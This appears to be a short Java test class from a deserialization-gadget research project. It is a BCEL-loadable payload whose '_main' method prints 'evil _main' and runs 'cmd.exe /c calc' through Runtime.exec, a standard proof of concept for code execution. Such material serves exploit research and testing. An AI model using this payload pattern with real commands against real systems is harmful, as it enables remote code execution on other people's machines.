package com.test.gadget.toStringBased;

import java.io.IOException;

public class BCELClass {
    public static void _main(String[] args) throws IOException {
        System.out.println("evil _main");
        Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", "calc"});
    }
}
